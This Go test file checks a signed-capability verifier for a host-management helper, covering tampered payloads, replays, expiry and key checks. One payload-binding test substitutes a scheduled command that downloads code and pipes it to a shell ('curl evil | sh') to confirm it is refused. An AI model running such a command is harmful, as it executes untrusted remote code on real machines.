package helpercap

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"path/filepath"
	"testing"
	"time"

	helperv1 "github.com/ultherego/flotestro/internal/genproto/flotestro/helper/v1"
	"github.com/ultherego/flotestro/internal/opspec"
)

// The negative matrix of chapter 19 for the helper: HLP-01 a request without
// a signature, HLP-02 a signature over a changed payload, HLP-03 a replay.

type fixture struct {
	t         *testing.T
	signer    *Signer
	now       time.Time
	canonical []byte
	verifier  *Verifier
	replayDir string
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	_, private, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	signer := NewSignerFromKey(private)
	canonical, err := CanonicalPayload(opspec.ActionUnitRestart, opspec.ActionVersion,
		opspec.Payload{Unit: &opspec.UnitPayload{Unit: "cron.service"}})
	if err != nil {
		t.Fatal(err)
	}
	f := &fixture{t: t, signer: signer, now: time.Unix(1_800_000_000, 0), canonical: canonical,
		replayDir: filepath.Join(t.TempDir(), "replay")}
	f.verifier = f.openVerifier()
	return f
}

// openVerifier stands in a fresh helper process over the same replay
// directory: a new store, a new life.
func (f *fixture) openVerifier() *Verifier {
	f.t.Helper()
	replay, err := OpenReplayStore(f.replayDir)
	if err != nil {
		f.t.Fatal(err)
	}
	f.t.Cleanup(func() { _ = replay.Close() })
	replay.now = func() time.Time { return f.now }
	return NewVerifierWith("host-1", NewKeyring(f.signer.PublicKey()), replay, func() time.Time { return f.now })
}

func (f *fixture) issue(mint Mint) (*helperv1.HelperCapability, []byte) {
	f.t.Helper()
	if mint.HostID == "" {
		mint.HostID = "host-1"
	}
	if mint.TaskID == "" {
		mint.TaskID = "task-1"
	}
	if mint.ActionType == "" {
		mint.ActionType = string(opspec.ActionUnitRestart)
	}
	if mint.PayloadSHA256 == nil {
		mint.PayloadSHA256 = PayloadDigest(f.canonical)
	}
	if mint.Now.IsZero() {
		mint.Now = f.now
	}
	capability, signature, err := f.signer.Issue(mint)
	if err != nil {
		f.t.Fatal(err)
	}
	return capability, signature
}

func (f *fixture) request(capability *helperv1.HelperCapability, signature []byte) *helperv1.HelperRequest {
	return &helperv1.HelperRequest{
		TaskId:              "task-1",
		Capability:          capability,
		CapabilitySignature: signature,
		CanonicalPayload:    append([]byte(nil), f.canonical...),
		Action: &helperv1.HelperRequest_UnitAction{UnitAction: &helperv1.UnitActionRequest{
			Unit: "cron.service", Operation: helperv1.UnitActionRequest_OPERATION_RESTART}},
	}
}

func expectCode(t *testing.T, err error, code string) {
	t.Helper()
	if got := CodeOf(err); got != code {
		t.Fatalf("code = %q (%v), want %q", got, err, code)
	}
}

// verify keeps the tests that only care about the refusal reading as they did.
func verify(v *Verifier, request *helperv1.HelperRequest) error {
	_, err := v.Verify(request, Expect(request))
	return err
}

func TestAValidCapabilityIsAcceptedOnce(t *testing.T) {
	f := newFixture(t)
	capability, signature := f.issue(Mint{})
	if err := verify(f.verifier, f.request(capability, signature)); err != nil {
		t.Fatalf("a valid capability was refused: %v", err)
	}
}

// HLP-01: the right user, no signature.
func TestHLP01NoSignatureIsRefusedUnderEnforce(t *testing.T) {
	f := newFixture(t)
	request := f.request(nil, nil)

	enforce := NewPolicy(ModeEnforce, f.verifier)
	decision := enforce.Decide(request)
	if decision.Allowed || decision.Code != ErrorCapabilityRequired {
		t.Fatalf("enforce let an unsigned request through: %+v", decision)
	}
	prefer := NewPolicy(ModePrefer, f.verifier)
	decision = prefer.Decide(request)
	if !decision.Allowed || !decision.Legacy || decision.Outcome != OutcomeLegacy {
		t.Fatalf("prefer did not mark the legacy request: %+v", decision)
	}
	legacy, _, refused, _ := prefer.Counters()
	if legacy != 1 || refused != 0 {
		t.Errorf("prefer counted legacy=%d refused=%d", legacy, refused)
	}
	// A read needs no capability under any mode.
	read := &helperv1.HelperRequest{Action: &helperv1.HelperRequest_LocalAccounts{
		LocalAccounts: &helperv1.LocalAccountsRequest{}}}
	if decision := enforce.Decide(read); !decision.Allowed || decision.Outcome != OutcomeRead {
		t.Fatalf("enforce refused a read: %+v", decision)
	}
}

// HLP-02: a valid signature, a payload changed by one byte.
func TestHLP02ChangedPayloadIsAPayloadHashMismatch(t *testing.T) {
	f := newFixture(t)
	capability, signature := f.issue(Mint{})
	request := f.request(capability, signature)
	request.CanonicalPayload[len(request.CanonicalPayload)-3] ^= 0x01
	expectCode(t, verify(f.verifier, request), ErrorPayloadMismatch)

	// Under prefer the refusal reaches the caller; under observe it is
	// recorded and the request passes.
	if decision := NewPolicy(ModePrefer, f.verifier).Decide(request); decision.Allowed {
		t.Fatalf("prefer let a changed payload through: %+v", decision)
	}
	decision := NewPolicy(ModeObserve, f.verifier).Decide(request)
	if !decision.Allowed || decision.Outcome != OutcomeObserved || decision.Code != ErrorPayloadMismatch {
		t.Fatalf("observe did not record the failure: %+v", decision)
	}
}

// One capability covers a whole task, and a task calls the helper more than
// once. So the nonce alone cannot decide: what must run once is one request
// under it, and a second ask for the same request is answered rather than
// performed.
func TestTheSameRequestUnderOneCapabilityRunsOnce(t *testing.T) {
	f := newFixture(t)
	capability, signature := f.issue(Mint{})
	request := f.request(capability, signature)

	first, err := f.verifier.Verify(request, Expect(request))
	if err != nil {
		t.Fatalf("the first request was refused: %v", err)
	}
	if !first.Fresh || first.Kept != nil {
		t.Fatalf("the first request was not reserved fresh: %+v", first)
	}
	if first.complete == nil {
		t.Fatal("the first request carries no way to record its answer")
	}
	if err := first.complete([]byte("the answer of the effect")); err != nil {
		t.Fatalf("recording the answer: %v", err)
	}

	// Asked again, the very same request gets that answer back and nothing
	// runs a second time.
	again, err := f.verifier.Verify(request, Expect(request))
	if err != nil {
		t.Fatalf("a repeat of a finished request was refused: %v", err)
	}
	if again.Fresh || string(again.Kept) != "the answer of the effect" {
		t.Fatalf("the repeat was not answered from the record: %+v", again)
	}

	// Another request of the same task is other work and runs on its own.
	other := f.request(capability, signature)
	other.TimeoutSeconds = request.GetTimeoutSeconds() + 7
	third, err := f.verifier.Verify(other, Expect(other))
	if err != nil {
		t.Fatalf("another request of the same task was refused: %v", err)
	}
	if !third.Fresh {
		t.Fatalf("another request of the same task was taken for the first one: %+v", third)
	}
}

// The digest names the request and not the order of a map in it: two
// marshallings of one request must not look like two requests.
func TestTheRequestDigestIgnoresTheOrderOfAMap(t *testing.T) {
	settings := map[string]string{
		"net.ipv4.ip_forward": "1", "kernel.dmesg_restrict": "1", "vm.swappiness": "10",
	}
	first := ""
	for i := 0; i < 8; i++ {
		request := &helperv1.HelperRequest{TaskId: "task-1",
			Action: &helperv1.HelperRequest_Kernel{Kernel: &helperv1.KernelRequest{
				Operation: helperv1.KernelRequest_OPERATION_SYSCTL_ENSURE,
				Settings:  settings,
			}}}
		digest, err := RequestDigest(request)
		if err != nil {
			t.Fatalf("the digest of the request: %v", err)
		}
		if first == "" {
			first = digest
			continue
		}
		if digest != first {
			t.Fatalf("one request gave two digests: %s and %s", first, digest)
		}
	}
}

// HLP-03: the nonce is consumed, the helper restarts, the same capability
// comes again.
func TestHLP03NonceReplayAfterRestartIsRefused(t *testing.T) {
	f := newFixture(t)
	capability, signature := f.issue(Mint{})
	request := f.request(capability, signature)
	if err := verify(f.verifier, request); err != nil {
		t.Fatal(err)
	}
	// The same request again, while the first is still on the books, is not a
	// second effect. This test used to require it to pass, which is how the
	// same signed order came to be carried out as often as it was asked for.
	expectCode(t, verify(f.verifier, request), ErrorCapabilityInFlight)

	restarted := f.openVerifier()
	expectCode(t, verify(restarted, request), ErrorCapabilityReplay)

	// A request that names another task than the capability does is not
	// the task's own request.
	other := f.request(capability, signature)
	other.TaskId = "task-2"
	expectCode(t, verify(restarted, other), ErrorWrongAction)
}

func TestWrongHostIsRefused(t *testing.T) {
	f := newFixture(t)
	capability, signature := f.issue(Mint{HostID: "host-2"})
	request := f.request(capability, signature)
	expectCode(t, verify(f.verifier, request), ErrorWrongHost)

	// A helper without an identity yet refuses every capability the same
	// way rather than trusting the capability's word about the host.
	unnamed := NewVerifierWith("", NewKeyring(f.signer.PublicKey()), f.verifier.replay, f.verifier.now)
	capability, signature = f.issue(Mint{})
	request = f.request(capability, signature)
	expectCode(t, verify(unnamed, request), ErrorWrongHost)
}

func TestWrongActionIsRefused(t *testing.T) {
	f := newFixture(t)
	capability, signature := f.issue(Mint{ActionType: string(opspec.ActionUnitStop)})
	request := f.request(capability, signature)
	expectCode(t, verify(f.verifier, request), ErrorWrongAction)
}

func TestExpiredAndNotYetValidAreRefused(t *testing.T) {
	f := newFixture(t)
	capability, signature := f.issue(Mint{Now: f.now.Add(-6 * time.Minute)})
	request := f.request(capability, signature)
	expectCode(t, verify(f.verifier, request), ErrorCapabilityExpired)

	capability, signature = f.issue(Mint{Now: f.now.Add(2 * time.Minute)})
	request = f.request(capability, signature)
	expectCode(t, verify(f.verifier, request), ErrorCapabilityExpired)

	// A clock a little behind the panel's is forgiven at the start of the
	// window, not at its end.
	capability, signature = f.issue(Mint{Now: f.now.Add(45 * time.Second)})
	request = f.request(capability, signature)
	if err := verify(f.verifier, request); err != nil {
		t.Fatalf("a capability issued 45 seconds ahead was refused: %v", err)
	}
}

// A window longer than the class allows is a window the panel would not have
// signed - whoever signed it.
func TestTTLTooLongIsRefused(t *testing.T) {
	f := newFixture(t)
	capability, _ := f.issue(Mint{})
	capability.ExpiresUnix = capability.NotBeforeUnix + int64((6 * time.Minute).Seconds())
	signature := Sign(f.signer.key, capability)
	request := f.request(capability, signature)
	expectCode(t, verify(f.verifier, request), ErrorTTLTooLong)

	// A package transaction gets ten minutes.
	if ClassOf(string(opspec.ActionPackageUpgrade)) != ClassPackages || TTLOf(string(opspec.ActionPackageUpgrade)) != 10*time.Minute {
		t.Errorf("packages.upgrade is in class %s with %s", ClassOf(string(opspec.ActionPackageUpgrade)), TTLOf(string(opspec.ActionPackageUpgrade)))
	}
	if ClassOf(string(opspec.ActionDiskWipe)) != ClassStorageDestructive || TTLOf(string(opspec.ActionDiskWipe)) != 2*time.Minute {
		t.Errorf("disk.wipe is in class %s with %s", ClassOf(string(opspec.ActionDiskWipe)), TTLOf(string(opspec.ActionDiskWipe)))
	}
	if ClassOf(string(opspec.ActionUnitRestart)) != ClassDefault {
		t.Errorf("unit.restart is in class %s", ClassOf(string(opspec.ActionUnitRestart)))
	}
}

func TestUnknownKeyAndBadSignatureAreRefused(t *testing.T) {
	f := newFixture(t)
	_, stranger, _ := ed25519.GenerateKey(rand.Reader)
	other := NewSignerFromKey(stranger)
	capability, signature, err := other.Issue(Mint{HostID: "host-1", TaskID: "task-1",
		ActionType: string(opspec.ActionUnitRestart), PayloadSHA256: PayloadDigest(f.canonical), Now: f.now})
	if err != nil {
		t.Fatal(err)
	}
	request := f.request(capability, signature)
	expectCode(t, verify(f.verifier, request), ErrorUnknownKey)

	// The right key identifier with somebody else's signature.
	capability.KeyId = f.signer.KeyID()
	request = f.request(capability, signature)
	expectCode(t, verify(f.verifier, request), ErrorBadSignature)

	// A field changed after signing.
	capability, signature = f.issue(Mint{})
	capability.Grants = append(capability.Grants, GrantScheduleRootExec)
	request = f.request(capability, signature)
	expectCode(t, verify(f.verifier, request), ErrorBadSignature)
}

func TestSchemaVersionIsCheckedFirst(t *testing.T) {
	f := newFixture(t)
	capability, signature := f.issue(Mint{HostID: "host-2"})
	capability.SchemaVersion = 2
	request := f.request(capability, signature)
	expectCode(t, verify(f.verifier, request), ErrorCapabilityVersion)
}

// The digest matches the bound payload, but the request names another
// target than the payload does.
func TestPayloadBindingMismatchIsRefused(t *testing.T) {
	f := newFixture(t)
	capability, signature := f.issue(Mint{})
	request := f.request(capability, signature)
	request.GetUnitAction().Unit = "sshd.service"
	expectCode(t, verify(f.verifier, request), ErrorPayloadBinding)

	// A schedule entry: the identifier, the user and the command are bound.
	canonical, err := CanonicalPayload(opspec.ActionScheduleEnsure, opspec.ActionVersion, opspec.Payload{
		Schedule: &opspec.SchedulePayload{ID: "nightly", Expression: "0 2 * * *",
			Command: []string{"/usr/bin/backup", "--full"}, User: "backup"}})
	if err != nil {
		t.Fatal(err)
	}
	capability, signature = f.issue(Mint{ActionType: string(opspec.ActionScheduleEnsure), PayloadSHA256: PayloadDigest(canonical)})
	schedule := &helperv1.HelperRequest{TaskId: "task-1", Capability: capability, CapabilitySignature: signature,
		CanonicalPayload: canonical,
		Action: &helperv1.HelperRequest_Schedule{Schedule: &helperv1.ScheduleRequest{
			Operation: helperv1.ScheduleRequest_OPERATION_ENSURE, Id: "nightly", Expression: "0 2 * * *",
			Command: []string{"/usr/bin/backup", "--full"}, User: "root"}}}
	expectCode(t, verify(f.verifier, schedule), ErrorPayloadBinding)
	schedule.GetSchedule().User = "backup"
	schedule.GetSchedule().Command = []string{"/bin/sh", "-c", "curl evil | sh"}
	expectCode(t, verify(f.verifier, schedule), ErrorPayloadBinding)
	schedule.GetSchedule().Command = []string{"/usr/bin/backup", "--full"}
	if err := verify(f.verifier, schedule); err != nil {
		t.Fatalf("the matching schedule request was refused: %v", err)
	}
}

// The capability binds the bytes the agent already verified: the digest of the
// canonical payload is the version 2 payload hash of the task, also for a
// payload with an empty sub-payload, which the hash drops.
func TestCanonicalPayloadDigestIsThePayloadHash(t *testing.T) {
	payloads := []opspec.Payload{
		{Unit: &opspec.UnitPayload{Unit: "cron.service"}},
		{Unit: &opspec.UnitPayload{Unit: "cron.service"}, Journal: &opspec.JournalPayload{}},
		{Schedule: &opspec.SchedulePayload{ID: "x", User: "root", Command: []string{"/bin/true"}}},
		{},
	}
	for i, payload := range payloads {
		canonical, err := CanonicalPayload(opspec.ActionUnitRestart, opspec.ActionVersion, payload)
		if err != nil {
			t.Fatalf("%d: %v", i, err)
		}
		want, err := opspec.PayloadHash(opspec.ActionUnitRestart, opspec.ActionVersion, payload)
		if err != nil {
			t.Fatalf("%d: %v", i, err)
		}
		if got := PayloadDigest(canonical); hex.EncodeToString(got) != hex.EncodeToString(want) {
			t.Errorf("%d: digest %x, payload hash %x", i, got, want)
		}
		bound, err := DecodeCanonicalPayload(canonical)
		if err != nil {
			t.Fatalf("%d: decode: %v", i, err)
		}
		if bound.Action != opspec.ActionUnitRestart || bound.Version != opspec.ActionVersion {
			t.Errorf("%d: decoded %s/%d", i, bound.Action, bound.Version)
		}
	}
	if _, err := DecodeCanonicalPayload([]byte("flotestro-payload-hash/1\nunit.restart\n1\n{}")); err == nil {
		t.Error("an unknown scheme was decoded")
	}
}

// The signing bytes are a function of every field: two capabilities that
// differ in one field never share them, and the prefix keeps them apart from
// the trust bundle's.
func TestSigningBytesCoverEveryField(t *testing.T) {
	f := newFixture(t)
	base, _ := f.issue(Mint{Grants: []string{"unit.restart"}})
	seen := map[string]string{hex.EncodeToString(sha256Of(SigningBytes(base))): "base"}
	variants := map[string]func(c *helperv1.HelperCapability){
		"schema":   func(c *helperv1.HelperCapability) { c.SchemaVersion = 2 },
		"key":      func(c *helperv1.HelperCapability) { c.KeyId = "other" },
		"id":       func(c *helperv1.HelperCapability) { c.CapabilityId = "other" },
		"host":     func(c *helperv1.HelperCapability) { c.HostId = "other" },
		"task":     func(c *helperv1.HelperCapability) { c.TaskId = "other" },
		"action":   func(c *helperv1.HelperCapability) { c.ActionType = "unit.stop" },
		"digest":   func(c *helperv1.HelperCapability) { c.PayloadSha256[0] ^= 1 },
		"nbf":      func(c *helperv1.HelperCapability) { c.NotBeforeUnix++ },
		"exp":      func(c *helperv1.HelperCapability) { c.ExpiresUnix++ },
		"nonce":    func(c *helperv1.HelperCapability) { c.Nonce[0] ^= 1 },
		"policy":   func(c *helperv1.HelperCapability) { c.PolicyRevision++ },
		"grants":   func(c *helperv1.HelperCapability) { c.Grants = []string{"unit.stop"} },
		"nogrants": func(c *helperv1.HelperCapability) { c.Grants = nil },
	}
	for name, change := range variants {
		copied := &helperv1.HelperCapability{
			SchemaVersion: base.SchemaVersion, KeyId: base.KeyId, CapabilityId: base.CapabilityId,
			HostId: base.HostId, TaskId: base.TaskId, ActionType: base.ActionType,
			PayloadSha256: append([]byte(nil), base.PayloadSha256...), NotBeforeUnix: base.NotBeforeUnix,
			ExpiresUnix: base.ExpiresUnix, Nonce: append([]byte(nil), base.Nonce...),
			PolicyRevision: base.PolicyRevision, Grants: append([]string(nil), base.Grants...),
		}
		change(copied)
		key := hex.EncodeToString(sha256Of(SigningBytes(copied)))
		if previous, clash := seen[key]; clash {
			t.Errorf("%s signs the same bytes as %s", name, previous)
		}
		seen[key] = name
	}
}

func sha256Of(data []byte) []byte {
	sum := sha256.Sum256(data)
	return sum[:]
}

func TestModeIsParsedStrictly(t *testing.T) {
	for value, want := range map[string]Mode{"": ModePrefer, "prefer": ModePrefer, "observe": ModeObserve,
		"audit": ModeObserve, "ENFORCE": ModeEnforce} {
		got, err := ParseMode(value)
		if err != nil || got != want {
			t.Errorf("ParseMode(%q) = %q, %v; want %q", value, got, err, want)
		}
	}
	if _, err := ParseMode("enforced"); err == nil {
		t.Error("a misspelt mode was accepted")
	}
}

func TestGrantsFollowTheCreator(t *testing.T) {
	root := opspec.Payload{Schedule: &opspec.SchedulePayload{ID: "x", User: "root", Command: []string{"/bin/true"}}}
	got := GrantsFor(opspec.ActionScheduleEnsure, root,
		[]string{"schedule.write", "schedule.run", "unit.restart", "hosts.read"}, false)
	want := []string{"schedule.run", "schedule.write"}
	if len(got) != len(want) || got[0] != want[0] || got[1] != want[1] {
		t.Errorf("grants without the root permission = %v", got)
	}
	got = GrantsFor(opspec.ActionScheduleEnsure, root, []string{"schedule.write"}, true)
	if len(got) != 2 || got[0] != GrantScheduleRootExec {
		t.Errorf("grants of an approved root entry = %v", got)
	}
	got = GrantsFor(opspec.ActionScheduleEnsure, root, []string{"schedule.write", GrantScheduleRootExec}, false)
	if len(got) != 2 || got[0] != GrantScheduleRootExec {
		t.Errorf("grants of a creator with the root permission = %v", got)
	}
	got = GrantsFor(opspec.ActionUnitRestart, opspec.Payload{Unit: &opspec.UnitPayload{Unit: "a"}}, nil, false)
	if len(got) != 1 || got[0] != "unit.restart" {
		t.Errorf("grants of a system task = %v", got)
	}
}

// Every mutating operation of the registry that goes through the helper is
// named by some expectation, so a capability for it can match a request.
func TestExpectationsCoverTheMutatingRequests(t *testing.T) {
	reads := []*helperv1.HelperRequest{
		{Action: &helperv1.HelperRequest_System{System: &helperv1.SystemRequest{}}},
		{Action: &helperv1.HelperRequest_IdentityProbe{IdentityProbe: &helperv1.IdentityProbeRequest{}}},
		{Action: &helperv1.HelperRequest_Schedule{Schedule: &helperv1.ScheduleRequest{Operation: helperv1.ScheduleRequest_OPERATION_READ}}},
		{Action: &helperv1.HelperRequest_PackageAction{PackageAction: &helperv1.PackageActionRequest{Operation: helperv1.PackageActionRequest_OPERATION_REFRESH}}},
		{Action: &helperv1.HelperRequest_Network{Network: &helperv1.NetworkRequest{Operation: helperv1.NetworkRequest_OPERATION_CONFIRM}}},
		{Action: &helperv1.HelperRequest_File{File: &helperv1.FileRequest{Operation: helperv1.FileRequest_OPERATION_PLAN}}},
	}
	for _, request := range reads {
		if Expect(request).Mutating {
			t.Errorf("%T is taken for a mutation", request.GetAction())
		}
	}
	mutations := map[*helperv1.HelperRequest]opspec.ActionType{
		{Action: &helperv1.HelperRequest_PackageAction{PackageAction: &helperv1.PackageActionRequest{Operation: helperv1.PackageActionRequest_OPERATION_INSTALL}}}: opspec.ActionAgentUpgrade,
		{Action: &helperv1.HelperRequest_File{File: &helperv1.FileRequest{Operation: helperv1.FileRequest_OPERATION_ENSURE}}}:                                      opspec.ActionFileRollback,
		{Action: &helperv1.HelperRequest_Schedule{Schedule: &helperv1.ScheduleRequest{Operation: helperv1.ScheduleRequest_OPERATION_RUN_NOW}}}:                     opspec.ActionScheduleRunNow,
		{Action: &helperv1.HelperRequest_Storage{Storage: &helperv1.StorageRequest{Operation: helperv1.StorageRequest_OPERATION_DISK_WIPE}}}:                       opspec.ActionDiskWipe,
		{Action: &helperv1.HelperRequest_Reboot{Reboot: &helperv1.RebootRequest{}}}:                                                                                opspec.ActionSystemReboot,
		{Action: &helperv1.HelperRequest_UnitAction{UnitAction: &helperv1.UnitActionRequest{Operation: helperv1.UnitActionRequest_OPERATION_MASK}}}:                opspec.ActionUnitMaskSet,
	}
	for request, action := range mutations {
		expectation := Expect(request)
		if !expectation.Mutating || !expectation.Allows(string(action)) {
			t.Errorf("%s does not authorize %T: %+v", action, request.GetAction(), expectation)
		}
		if expectation.Allows(string(opspec.ActionReadJournal)) {
			t.Errorf("%T accepts a capability for a read", request.GetAction())
		}
	}
	// An unknown operation is a mutation nothing authorizes.
	unknown := &helperv1.HelperRequest{Action: &helperv1.HelperRequest_UnitAction{UnitAction: &helperv1.UnitActionRequest{}}}
	if expectation := Expect(unknown); !expectation.Mutating || len(expectation.Actions) != 0 {
		t.Errorf("an unspecified unit operation is %+v", expectation)
	}
	// A request without an action runs nothing and is the agent's question
	// about the mode; it is not a mutation to count as legacy.
	if expectation := Expect(&helperv1.HelperRequest{}); expectation.Mutating {
		t.Error("a request without an action is taken for a mutation")
	}
}
